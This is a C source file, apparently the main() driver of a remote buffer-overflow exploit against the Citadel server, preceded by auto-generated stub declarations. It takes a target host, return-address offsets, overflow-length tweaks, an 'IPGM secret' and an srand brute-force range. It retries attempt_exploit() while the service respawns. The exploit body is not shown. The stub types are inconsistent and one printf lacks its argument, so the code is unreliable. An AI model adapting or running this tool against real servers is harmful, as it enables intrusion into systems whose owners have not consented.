
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int NUM_ATTEMPTS ;
 void* RESPAWN_SLEEP ;
 int SEED_MAX ;
 int SEED_START ;

 int SIZ ;

 int SUCCESS ;
 int adjustRet ;
 void* atoi (int ) ;
 int attempt_exploit () ;
 int bufLenAdjust ;
 int ch ;
 int exit (int) ;
 int getopt (int,char**,char*) ;
 char* host ;
 int localNet ;
 int magicNumber ;
 int nanoSecondsToSleep ;
 int optarg ;
 int printf (char*,...) ;
 int retAddr ;
 int retVal ;
 int sleep (void*) ;
 int strncpy (char*,int ,int ) ;
 int strtoul (int ,int *,int) ;
 int usage () ;

main(int argc, char **argv) {
 int exploitAttempts=0;


 while((ch=getopt(argc, argv, "t:li:s:hr:a:A:o:O:b:B:n:S:"))!=-1) {
  switch(ch) {
 case 't':
  strncpy(host, optarg, SIZ-1);
  break;
 case 'i':
  magicNumber=atoi(optarg);
  printf("[-] Using IPGM secret: %d\n", magicNumber);
  break;
 case 'l':
  localNet=1;
  printf("[-] Using local net hack\n");
  break;
 case 's':
  nanoSecondsToSleep=atoi(optarg);
  printf("[-] Using sleep count of %d where necessary\n", nanoSecondsToSleep);
  break;
 case 'r':
  retAddr=strtoul(optarg,((void*)0),16);
  printf("[-] Using RET address: 0x%08x\n", retAddr);
  break;
 case 'a':
  adjustRet=atoi(optarg);
  retAddr+=adjustRet;
  printf("[-] Using RET address: 0x%08x\n", retAddr);
  break;
 case 'A':
  adjustRet=atoi(optarg);
  retAddr-=adjustRet;
  printf("[-] Using RET address: 0x%08x\n", retAddr);
  break;
 case 'o':
  bufLenAdjust=atoi(optarg);
  printf("[-] Increasing overflow buffer by %d bytes\n", bufLenAdjust);
  break;
 case 'O':
  bufLenAdjust=atoi(optarg);
  bufLenAdjust=-bufLenAdjust;
  printf("[-] Decreasing overflow buffer by %d bytes\n", bufLenAdjust);
  break;
 case 'b':
  SEED_START=atoi(optarg);
  printf("[-] Bruteforce starting at srand(%d)\n", SEED_START);
  break;
 case 'B':
  SEED_MAX=atoi(optarg);
  printf("[-] Bruteforce ending at srand(%d)\n", SEED_MAX);
  break;
 case 'n':
  NUM_ATTEMPTS=atoi(optarg);
  printf("[-] Will try exploit %d times\n", NUM_ATTEMPTS);
  break;
 case 'S':
  RESPAWN_SLEEP=atoi(optarg);
  printf("[-] Will sleep for %d seconds between exploit attempts\n");
  break;
 case 'h':
 default:
  usage();
  exit(0);
  }
 }

 while(exploitAttempts++ < NUM_ATTEMPTS && (retVal=attempt_exploit())!=SUCCESS) {
  switch(retVal) {
 case 132:
  printf("[*] Couldn't connect to host: %s not found.\n", host);
  exit(1);
  break;
 case 128:
  printf("[*] Couldn't grab a socket!\n");
  exit(1);
  break;
 case 133:
  printf("[*] Connection to %s was rejected\n",host);
  exit(1);
 case 130:
  printf("[!] WARNING: Failed to set TCP_NODELAY option on socket\n");
  break;
 case 134:
  printf("[*] Brute force operation failed. Aborting.\n");
  exit(1);
  break;
 case 131:
  printf("[*] IPGM secret incorrect!\n");
  exit(1);
  break;
 case 129:
  printf("[!] This attempt failed... waiting for INIT to respawn Citadel...\n");
  sleep(RESPAWN_SLEEP);
  break;
 default:
  printf("[*] ERROR: There was no error!\n");
  break;
  }
 }
 if(exploitAttempts==NUM_ATTEMPTS)
  printf("[-] Exploit failed %d times. Aborting.\n", exploitAttempts);

 printf("\nHave a nice day!\n");
 exit(0);
}
